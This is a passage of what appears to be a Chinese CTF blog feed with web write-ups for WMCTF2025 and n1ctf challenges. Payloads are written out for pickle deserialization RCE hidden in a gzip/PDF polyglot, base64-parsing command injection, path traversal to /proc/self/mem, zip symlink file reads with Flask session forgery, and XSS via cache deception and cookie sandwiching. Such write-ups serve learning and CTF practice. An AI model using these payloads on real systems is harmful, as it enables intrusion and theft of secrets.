class="hljs-keyword">class</span> <span class="hljs-title class_">Tmp</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&quot;mkdir ./static;cat /flag &gt; /app/static/1.txt&quot;</span>,))<br><br>obj = Tmp()<br>ser_data = pickle.dumps(obj)<br></code></pre></td></tr></table></figure><p>但是有一个问题，这题只能上传pdf，如果不是pdf的格式执行到这段代码的时候会报错，导致文件不会写入到uploads目录下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment"># just if is a pdf</span><br>    parser = PDFParser(io.BytesIO(pdf_content))<br>    doc = PDFDocument(parser)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(e), <span class="hljs-number">500</span><br></code></pre></td></tr></table></figure><p>这里有两个解决办法</p><ol><li>利用gz文件的格式</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css">gzip文件格式可以分为四个部分：<br><br>文件头必选部分<span class="hljs-selector-attr">[10个字节]</span><br>文件头可选部分<span class="hljs-selector-attr">[0-N字节]</span><br>数据部分<br>文件尾部分<span class="hljs-selector-attr">[8个字节]</span><br></code></pre></td></tr></table></figure><p>我们把pdf文件尾写到gz的文件头可选部分，pickle的数据写到数据部分，这样在反序列化的时候只会反序列化pickle数据，（pdf只要有文件尾就可以识别成功）</p><p>可以在命令行执行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;gASVHgAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=&quot;</span> | <span class="hljs-built_in">base64</span> -d | pigz --fast --comment $<span class="hljs-string">&#x27;\ntrailer\n&lt;&lt; /Root 1 0 R /Size 1 &gt;&gt;\nstartxref\n&#x27;</span> &gt; pickle.pickle.gz<br></code></pre></td></tr></table></figure><ol start="2"><li>利用gz的compresslevel参数</li></ol><p>在gzip压缩文件时，如果指定了compress参数等于0，就会不压缩数据，只为文件添加gz格式，这样pdf在gz文件内就能保持命令，也就可以识别成功，所以只需要</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> gzip.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;pickle.pickle1.gz&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>,compresslevel=<span class="hljs-number">0</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(ser_data)<br>    f.write(pdf_content)<br></code></pre></td></tr></table></figure><h1 id="攻击"><a href="/2025/09/23/WMCTF2025/#攻击" class="headerlink" title="攻击"></a>攻击</h1><p>先把pickle.pickle.gz传上去，再把pdf传上去就行了，无回显不出网可以写静态文件或者通过报错带出来</p>]]></content>
    
    
    
    <tags>
      
      <tag>pickle反序列化</tag>
      
      <tag>gz文件的特性</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>n1ctf_web_wp</title>
    <link href="/2025/09/15/n1ctf-web-wp/"/>
    <url>/2025/09/15/n1ctf-web-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="ping"><a href="/2025/09/15/n1ctf-web-wp/#ping" class="headerlink" title="ping"></a>ping</h1><p>分析代码，显然需要在</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">command = <span class="hljs-string">f&quot;&quot;&quot;echo &quot;ping -c 1 $(echo &#x27;<span class="hljs-subst">&#123;ip_base64&#125;</span>&#x27; | base64 -d)&quot; | sh&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>进行命令执行，只需要让$(echo ‘{ip_base64}’ | base64 -d)  –&gt;    127.0.0.1;whoami  拼接一下即可</p><p>但是由于前面的正则匹配等严格要求了解码后必须是ip的格式，所以只能进行绕过</p><p>尝试绕过正则无果   观察到明明一开始就对ip_base64进行了一次base64解码，但是在命令执行的时候明明可以直接使用却还要解码一次，猜测是两种解码方式的差异</p><p>思路是让python的base64.b64decode()函数只解析出前面的ip地址，而bash在base64 -d 的时候解析出完整的拼接后的命令</p><p>分析python b64decode函数的源码发现底层由c实现，注意到如下代码</p><p><img src="/2025/09/15/n1ctf-web-wp/image-20250914232153626.png" alt="image-20250914232153626"></p><p>也就是当python解析到&#x3D;&#x3D;之后如果后面还有内容，在严格模式下会报错，而非严格模式下会停止解析但不会报错，可以试验一下</p><p><img src="/2025/09/15/n1ctf-web-wp/image-20250914232401063.png" alt="image-20250914232401063"></p><p>python成功只解码出了1.1.1.1，而bash却能解析出完整的命令</p><p><img src="/2025/09/15/n1ctf-web-wp/image-20250914232507326.png" alt="image-20250914232507326"></p><p>利用这个就能绕过检测并且拼接执行命令了，直接cat &#x2F;flag即可，如下图</p><p><img src="/2025/09/15/n1ctf-web-wp/image-20250914234321695.png" alt="image-20250914234321695"></p><h1 id="Peek-a-Fork"><a href="/2025/09/15/n1ctf-web-wp/#Peek-a-Fork" class="headerlink" title="Peek a Fork"></a>Peek a Fork</h1><p>代码审计</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    flag = f.read()<br>mm = mmap.mmap(-<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(flag))<br>mm.write(flag)<br>os.remove(<span class="hljs-string">&#x27;flag.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><p>flag放到了匿名进程中，可以通过读取&#x2F;proc&#x2F;self&#x2F;mem函数读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> filename:<br>            response_body = PAGE<br>            response_status = <span class="hljs-string">&quot;200 OK&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(os.path.normpath(filename), <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    <span class="hljs-keyword">if</span> offset &gt; <span class="hljs-number">0</span>:<br>                        f.seek(offset)<br>                    <br>                    data_bytes = f.read(length)<br> <br>                    response_body = data_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;ignore&#x27;</span>)<br>                response_status = <span class="hljs-string">&quot;200 OK&quot;</span><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br><br>                response_body = <span class="hljs-string">f&quot;Invalid path&quot;</span><br>                response_status = <span class="hljs-string">&quot;500 Internal Server Error&quot;</span><br><br>        response = <span class="hljs-string">f&quot;HTTP/1.1 <span class="hljs-subst">&#123;response_status&#125;</span>\r\nContent-Length: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(response_body)&#125;</span>\r\n\r\n<span class="hljs-subst">&#123;response_body&#125;</span>&quot;</span><br>        conn.sendall(response.encode())<br></code></pre></td></tr></table></figure><p>这里可以读文件，找一下filename的定义</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    path = request_data.split(<span class="hljs-string">b&#x27; &#x27;</span>)[<span class="hljs-number">1</span>]<br>    pattern = <span class="hljs-string">rb&#x27;\?offset=(\d+)&amp;length=(\d+)&#x27;</span><br>    <br>    offset = <span class="hljs-number">0</span><br>    length = -<span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">match</span> = re.search(pattern, path)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        offset = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>).decode())<br>        length = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>).decode())<br>        <br>        clean_path = re.sub(pattern, <span class="hljs-string">b&#x27;&#x27;</span>, path)<br>        filename = clean_path.strip(<span class="hljs-string">b&#x27;/&#x27;</span>).decode()<br>    <span class="hljs-keyword">else</span>:<br>        filename = path.strip(<span class="hljs-string">b&#x27;/&#x27;</span>).decode()<br><br><span class="hljs-keyword">except</span> Exception:<br>    response = <span class="hljs-string">b&quot;HTTP/1.1 400 Bad Request\r\n\r\nInvalid Request&quot;</span><br>    conn.sendall(response)<br>    <span class="hljs-keyword">return</span><br><br></code></pre></td></tr></table></figure><p>这里获取clean_path的逻辑是先匹配到?offset&#x3D;(\d+)&amp;length&#x3D;(\d+)，然后从path里面把这一整串给去除掉</p><p>然后去除掉首尾的&#x2F;得到filename</p><p>漏洞点在于waf是在main函数中获取到初始数据的时候就直接检测的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(term <span class="hljs-keyword">in</span> initial_data.lower() <span class="hljs-keyword">for</span> term <span class="hljs-keyword">in</span> FORBIDDEN):<br>    conn.sendall(<span class="hljs-string">b&quot;HTTP/1.1 403 Forbidden\r\n\r\nSuspicious request pattern detected.&quot;</span>)<br>    conn.close()<br>    <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>如果存在这种情况</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">path</span> = rb<span class="hljs-string">&quot;/pro?offset=1&amp;length=1c&quot;</span><br><span class="hljs-attr">clean_path</span> = b<span class="hljs-string">&quot;/proc&quot;</span><br><span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;proc&quot;</span><br></code></pre></td></tr></table></figure><p>这样就可以绕过黑名单传入proc了，还有一个问题是proc在根目录所以要穿越一下</p><p>利用相同的原理绕过.. 和.&#x2F;的限制</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile">path=rb<span class="hljs-string">&quot;?offset=0&amp;length=100000.?offset=0&amp;length=100000.?offset=0&amp;length=100000/pro?</span><br><span class="hljs-string">offset=0&amp;length=100000c/self/environ&quot;</span><br><br>clean_path = b<span class="hljs-string">&quot;../proc/self/environ&quot;</span><br>filename= <span class="hljs-string">&quot;../proc/self/environ&quot;</span><br>能直接读到环境变量文件<br></code></pre></td></tr></table></figure><p>所以接下来我们读&#x2F;proc&#x2F;self&#x2F;mem文件就能拿到flag</p><p>直接访问</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000.</span>?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000.</span>?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000</span>/pro?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000</span>c/self/mem<br></code></pre></td></tr></table></figure><p>会发现返回invalid path</p><p>查了一下发现是因为读取mem文件有权限要求，有些不可读的部分，只能读取有权限的部分，这里可以通过offset和length来控制</p><p>读一下&#x2F;proc&#x2F;self&#x2F;maps文件查看python进程的内存地址</p><p><img src="/2025/09/15/n1ctf-web-wp/image-20250915001049199.png" alt="image-20250915001049199"></p><p>这里选择从7f7861a02000（140155010686976）爆破到7ffc799d2000（140722348826624），把内存地址转换为十进制数然后传给offset参数设置一下步长，爆破速度挺快的</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">offset</span>=<span class="hljs-number">140155010686976</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000.</span>?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000.</span>?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000</span>/pro?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000</span>c/self/mem<br></code></pre></td></tr></table></figure><p>最后在7f7862fd8000-7f7862fd9000这一块内存中读到了 查了一下发现是因为mmap是创建了匿名内存映射，这一块就是匿名内存</p><h1 id="online-unzipper"><a href="/2025/09/15/n1ctf-web-wp/#online-unzipper" class="headerlink" title="online_unzipper"></a>online_unzipper</h1><p>代码审计找到漏洞点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    os.system(<span class="hljs-string">f&quot;unzip -o <span class="hljs-subst">&#123;zip_path&#125;</span> -d <span class="hljs-subst">&#123;target_dir&#125;</span>&quot;</span>)<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;解压失败，请检查文件格式&quot;</span><br></code></pre></td></tr></table></figure><p>这里有一个命令执行，如果存在可控的地方就能利用这里读出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> role == <span class="hljs-string">&quot;admin&quot;</span>:<br>    dirname = request.form.get(<span class="hljs-string">&quot;dirname&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-built_in">str</span>(uuid.uuid4())<br><span class="hljs-keyword">else</span>:<br>    dirname = <span class="hljs-built_in">str</span>(uuid.uuid4())<br><br>target_dir = os.path.join(UPLOAD_FOLDER, dirname)<br>os.makedirs(target_dir, exist_ok=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>发现如果是admin用户的话就能指定dirname，本质上也就是指定了target_dir，同样是拼接一下就能执行命令</p><p>接下来需要看看如何登录admin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">role = session[<span class="hljs-string">&quot;role&quot;</span>]<br></code></pre></td></tr></table></figure><p>role是从session中获取的，普通用户注册的时候role只能是user</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        username = request.form[<span class="hljs-string">&quot;username&quot;</span>]<br>        password = request.form[<span class="hljs-string">&quot;password&quot;</span>]<br><br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;用户名已存在&quot;</span><br><br>        users[username] = &#123;<span class="hljs-string">&quot;password&quot;</span>: password, <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>&#125;<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;login&quot;</span>))<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;register.html&quot;</span>)<br></code></pre></td></tr></table></figure><p>那么肯定是要伪造session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">app.secret_key = os.environ.get(<span class="hljs-string">&quot;FLASK_SECRET_KEY&quot;</span>, <span class="hljs-string">&quot;test_key&quot;</span>)<br></code></pre></td></tr></table></figure><p>session的key是从环境变量中获取的，所以还是需要读一下&#x2F;proc&#x2F;self&#x2F;environ文件</p><p>我们上传的压缩包会通过unzip -o进行解压，解压时如果 ZIP 包中包含软链接文件，<code>unzip</code>默认会保留软链接的指向关系</p><p>所以可以利用软链接来实现任意文件读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /proc/self/environ <span class="hljs-built_in">link</span>   创建一个软链接<br><br>zip -y exploit.zip <span class="hljs-built_in">link</span><br><br>上传exploit.zip，直接访问里面的<span class="hljs-built_in">link</span>就能获取到环境变量文件<br><br></code></pre></td></tr></table></figure><p><img src="/2025/09/15/n1ctf-web-wp/image-20250915003503909.png" alt="image-20250915003503909"></p><p>FLASK_SECRET_KEY&#x3D;#mu0cw9F#7bBCoF! </p><p>接下来利用这个key生成一个admin的session再替换我们自己注册的用户的session</p><p><img src="/2025/09/15/n1ctf-web-wp/image-20250915003552152.png" alt="image-20250915003552152"></p><p>用户变为admin之后发现上传文件时多了一个指定dirname的输入框，随便上传一个文件同时传入</p><p>dirname&#x3D;test; cat &#x2F;flag* &gt; .&#x2F;uploads&#x2F;test&#x2F;flag.txt</p><p>再访问&#x2F;download&#x2F;test&#x2F;flag.txt就能拿到flag</p><h1 id="Unfinished"><a href="/2025/09/15/n1ctf-web-wp/#Unfinished" class="headerlink" title="Unfinished"></a>Unfinished</h1><p>首先还是寻找漏洞点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">visit_url</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">try</span>:<br>        flag_value = os.environ.get(<span class="hljs-string">&#x27;FLAG&#x27;</span>, <span class="hljs-string">&#x27;flag&#123;fake&#125;&#x27;</span>)<br><br>        <span class="hljs-keyword">with</span> sync_playwright() <span class="hljs-keyword">as</span> p:<br>            browser = p.chromium.launch(headless=<span class="hljs-literal">True</span>, args=[<span class="hljs-string">&quot;--no-sandbox&quot;</span>])<br>            context = browser.new_context()<br><br>            context.add_cookies([&#123;<br>                <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;flag&#x27;</span>,<br>                <span class="hljs-string">&#x27;value&#x27;</span>: flag_value,<br>                <span class="hljs-string">&#x27;domain&#x27;</span>: <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>                <span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;/&#x27;</span>,<br>                <span class="hljs-string">&#x27;httponly&#x27;</span>: <span class="hljs-literal">True</span><br>            &#125;])<br><br>            page = context.new_page()<br>            page.goto(<span class="hljs-string">&quot;http://localhost/login&quot;</span>, timeout=<span class="hljs-number">5000</span>)<br>            page.fill(<span class="hljs-string">&quot;input[name=&#x27;username&#x27;]&quot;</span>, <span class="hljs-string">&quot;admin&quot;</span>)<br>            page.fill(<span class="hljs-string">&quot;input[name=&#x27;password&#x27;]&quot;</span>, admin_password)<br>            page.click(<span class="hljs-string">&quot;input[name=&#x27;submit&#x27;]&quot;</span>)<br>            page.wait_for_timeout(<span class="hljs-number">3000</span>)<br>            page.goto(url, timeout=<span class="hljs-number">5000</span>)<br>            page.wait_for_timeout(<span class="hljs-number">5000</span>)<br>            browser.close()<br></code></pre></td></tr></table></figure><p>观察到这个函数是bot会先登录然后去访问传入的url，而在view路由中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/view&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-meta">@login_required</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view_user</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    # I found a bug in it.</span><br><span class="hljs-string">    # Until I fix it, I&#x27;ve banned /api/bio/. Have fun :)</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    username = request.args.get(<span class="hljs-string">&quot;username&quot;</span>,default=current_user.username)<br>    visit_url(<span class="hljs-string">f&quot;http://localhost/api/bio/<span class="hljs-subst">&#123;username&#125;</span>&quot;</span>)<br>    template = <span class="hljs-string">f&quot;&quot;&quot;</span><br><span class="hljs-string">    &#123;&#123;% extends &quot;base.html&quot; %&#125;&#125;</span><br><span class="hljs-string">    &#123;&#123;% block title %&#125;&#125;success&#123;&#123;% endblock %&#125;&#125;</span><br><span class="hljs-string">    &#123;&#123;% block content %&#125;&#125;</span><br><span class="hljs-string">    &lt;h1&gt;bot will visit your bio&lt;/h1&gt;</span><br><span class="hljs-string">    &lt;p style=&quot;margin-top: 1.5rem;&quot;&gt;&lt;a href=&quot;&#123;&#123;&#123;&#123; url_for(&#x27;index&#x27;) &#125;&#125;&#125;&#125;&quot;&gt;Back to Home&lt;/a&gt;&lt;/p&gt;</span><br><span class="hljs-string">    &#123;&#123;% endblock %&#125;&#125;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> render_template_string(template)<br></code></pre></td></tr></table></figure><p>登录之后就会让bot去访问一下<a href="http://localhost/api/bio/%7Busername%7D%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%AC%E7%9A%84bio%E7%95%8C%E9%9D%A2%EF%BC%8C%E5%90%8C%E6%97%B6%E6%9C%89%E4%B8%80%E4%B8%AA%E7%BC%96%E8%BE%91%E6%88%91%E4%BB%ACbio%E7%95%8C%E9%9D%A2%E7%9A%84%E5%8A%9F%E8%83%BD%EF%BC%8C%E6%89%80%E4%BB%A5%E5%BE%88%E5%AE%B9%E6%98%93%E8%81%94%E6%83%B3%E5%88%B0xss%EF%BC%8C%E4%BD%86%E6%98%AF%E6%9C%89%E4%B8%89%E4%B8%AA%E9%97%AE%E9%A2%98%EF%BC%8C%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%98%AFnginx%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%AD%E7%A6%81%E6%AD%A2%E4%BA%86%E8%AE%BF%E9%97%AE/api/bio">http://localhost/api/bio/{username}，也就是我们的bio界面，同时有一个编辑我们bio界面的功能，所以很容易联想到xss，但是有三个问题，第一个是nginx的配置中禁止了访问/api/bio</a></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span> default_server;<br>    <span class="hljs-attribute">server_name</span> _;<br><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:5000;<br>    &#125;<br><br>    <span class="hljs-section">location</span> /api/bio/ &#123;<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>;<br>    &#125;<br><br>    <span class="hljs-section">location</span> <span class="hljs-regexp">~ \.(css|js)$</span> &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:5000;<br>        <span class="hljs-attribute">proxy_ignore_headers</span> Vary;<br>        <span class="hljs-attribute">proxy_cache</span> static_cache;<br>        <span class="hljs-attribute">proxy_cache_valid</span> <span class="hljs-number">200</span> <span class="hljs-number">10m</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是呢，如果是以js,css结尾的静态资源，就会被代理并且写入缓存中，本意是为了减少服务器的消耗，而这里帮我们绕过了&#x2F;api&#x2F;bio&#x2F;，只要我们的username是以js或者css结尾的，访问<a href="http://localhost/api/bio/%7Busername%7D%E7%9A%84%E6%97%B6%E5%80%99%E5%B0%B1%E4%B8%8D%E4%BC%9A%E8%BF%94%E5%9B%9E403">http://localhost/api/bio/{username}的时候就不会返回403</a></p><p>假设我们的用户名为1.js，第二个问题是 bot在访问我们的bio界面的时候，有一个身份的校验，就是只有自己能访问自己的bio</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> current_user.username == username:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unauthorized&quot;</span>, <span class="hljs-number">401</span><br></code></pre></td></tr></table></figure><p>这里也好解决，前面说了如果是js或者css结尾的请求会被写到缓存里，下次读的时候会直接读缓存里的东西，那么我们先自己去访问一下&#x2F;api&#x2F;bio&#x2F;1.js，再通过&#x2F;view路由让bot去访问，这样username是1.js，current_user.username实际上的从缓存里面读出来的就能绕过了</p><p>第三个问题时httpOnly，但是可以注意到题目中其实写的时httponly,其实是失效的，直接用xss的payload就能打出来</p><p><strong>如果这个httpOnly是生效的怎么办？</strong></p><p>这样的话直接利用xss是带不出cookie的,利用三明治攻击可以把受httpOnly保护的cookie窃取出来</p><p>大致原理就是让服务器错误解析，利用cookie&#x3D;ticket&#x3D;”abc;    aaa&#x3D;bbb”让服务器错误解析从而将访问者的cookie放到中间带了出来</p><p>讲解文章：<a href="https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique">https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique</a></p><p>payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-keyword">const</span> url = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">&quot;http://localhost/ticket&quot;</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span 